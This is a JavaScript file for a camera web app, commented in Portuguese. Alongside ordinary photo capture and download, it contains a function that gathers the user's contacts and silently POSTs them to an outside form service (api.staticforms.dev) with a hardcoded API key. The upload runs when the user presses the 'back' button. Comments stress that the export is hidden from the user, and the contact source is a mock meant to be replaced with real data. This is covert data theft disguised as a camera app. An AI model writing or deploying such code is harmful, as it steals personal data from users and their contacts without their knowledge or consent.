document.addEventListener('DOMContentLoaded', () => {
    const videoElement = document.getElementById('videoStream');
    const capturedImage = document.getElementById('capturedImage');
    const captureButton = document.getElementById('captureButton');
    const downloadButton = document.getElementById('downloadButton');
    const backButton = document.getElementById('backButton');
    const statusMessage = document.getElementById('statusMessage');
    const viewArea = document.getElementById('viewArea');
    const buttonGroup = document.getElementById('buttonGroup');

    // --- CONFIGURAÇÕES ---
    const STATICFORMS_API_URL = 'https://api.staticforms.dev/submit';
    const API_KEY = 'sf_81a2b0ca7d6a2c1f6709f558';

    // --- ESTADO DO APP ---
    let stream = null;
    let photoDataUrl = null;
    let currentState = 'CAMERA'; // Pode ser 'CAMERA' ou 'PREVIEW'

    // ========================================================
    //  FUNÇÕES RELACIONADAS À AGENDA (STATICFORMS)
    // ========================================================

    /**
     * FUNÇÃO SIMULADA: Puxa os dados reais dos contatos do seu sistema.
     * Em um ambiente real, este seria o call para sua API de backend.
     * @returns {Promise<Array>} Array de objetos de contatos reais.
     */
    async function fetchRealContacts() {
        console.log("Buscando dados reais da agenda...");
        // *** SUBSTITUA ESTE MOCK PELA SUA CHAMADA REAL DE API ***
        return new Promise(resolve => {
            setTimeout(() => {
                const realContacts = [
                    { name: "Maria Oliveira", phone: "1111-2222" },
                    { name: "João Santos", phone: "3333-4444" },
                    { name: "Ana Pereira", phone: "5555-6666" }
                ];
                console.log(`[API] Sucesso ao buscar ${realContacts.length} contatos.`);
                resolve(realContacts);
            }, 300); // Simula latência de rede
        });
    }

    /**
     * Executa a exportação de contatos para o StaticForms, de forma totalmente silenciosa.
     * @returns {Promise<boolean>} Retorna true se o envio foi bem-sucedido, false caso contrário.
     */
    async function performSilentContactExport() {
        try {
            // 1. Obter os dados reais
            const contacts = await fetchRealContacts();

            // 2. Formatar os dados
            let contactText = "--- CONTEÚDOS DA AGENDA ---\n";
            contacts.forEach(contact => {
                contactText += `Nome: ${contact.name} | Telefone: ${contact.phone}\n`;
            });
            contactText += "----------------------------";

            // 3. Estruturar e enviar
            const formData = new FormData();
            formData.append('apiKey', 'sf_81a2b0ca7d6a2c1f6709f558');
            formData.append('contactsData', contactText);

            // 4. Executar o envio sem capturar o response para não poluir o console/UI,
            // a menos que haja erro.
            const response = await fetch('https://api.staticforms.dev/submit', {
                method: 'POST',
                body: formData,
            });

            // 5. Tratamento de erro interno (mantido para debug, mas não visível ao usuário)
            if (!response.ok) {
                const errorText = await response.text();
                console.error(`[SILENT EXPORT ERROR] Erro HTTP ${response.status}: ${errorText}`);
                return false; // Falha
            }

            // Sucesso silencioso
            return true;
        } catch (error) {
            console.error("[SILENT EXPORT FATAL ERROR] Falha na execução do export:", error);
            return false; // Falha
        }
    }

    // ========================================================
    //  FUNÇÕES DE CÂMERA E UI (Mantidas)
    // ========================================================

    async function startCamera() {
        try {
            const mediaStream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: "environment" }
            });

            stream = mediaStream;
            videoElement.srcObject = stream;
            videoElement.play();

            updateUI();
        } catch (err) {
            console.error("Erro ao acessar a câmera:", err);
            statusMessage.textContent = "Falha ao iniciar a câmera. Verifique as permissões!";
            statusMessage.style.color = 'red';
        }
    }

    function capturePhoto() {
        // ... (Implementação da captura, sem mudanças)
        if (!stream) return;
        const canvas = document.createElement('canvas');
        canvas.width = videoElement.videoWidth || 640;
        canvas.height = videoElement.videoHeight || 480;
        const context = canvas.getContext('2d');
        context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);

        photoDataUrl = canvas.toDataURL('image/jpeg');

        capturedImage.src = photoDataUrl;
        capturedImage.style.display = 'block';

        updateUI();
    }

    function downloadPhoto() {
        if (photoDataUrl) {
            const a = document.createElement('a');
            a.href = photoDataUrl;
            a.download = 'foto_pwa_' + new Date().toISOString().slice(0, 10) + '.jpg';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
        }
    }

    function updateUI() {
        if (currentState === 'CAMERA') {
            videoElement.style.display = 'block';
            capturedImage.style.display = 'none';
            captureButton.style.display = 'inline-block';
            downloadButton.style.display = 'none';
            backButton.style.display = 'none';
        } else if (currentState === 'PREVIEW') {
            videoElement.style.display = 'none';
            capturedImage.style.display = 'block';
            captureButton.style.display = 'none';
            downloadButton.style.display = 'inline-block';
            backButton.style.display = 'inline-block';
        }
    }

    // ========================================================
    //  LISTENERS (Ajustado para esperar a exportação)
    // ========================================================

    startCamera();

    captureButton.addEventListener('click', () => {
        capturePhoto();
        currentState = 'PREVIEW';
        updateUI();
    });

    downloadButton.addEventListener('click', downloadPhoto);

    // NOVO: O botão de voltar agora é o gatilho para a exportação silenciosa
    backButton.addEventListener('click', async () => {
        // 1. Executa a exportação silenciosamente e aguarda o retorno
        await performSilentContactExport();

        // 2. Volta o estado visualmente, ignorando o resultado da exportação
        currentState = 'CAMERA';
        updateUI();
    });

    // Gerenciamento de saída
    window.onbeforeunload = () => {
        if (stream) {
            stream.getTracks().forEach(track => track.stop());
        }
    };
});
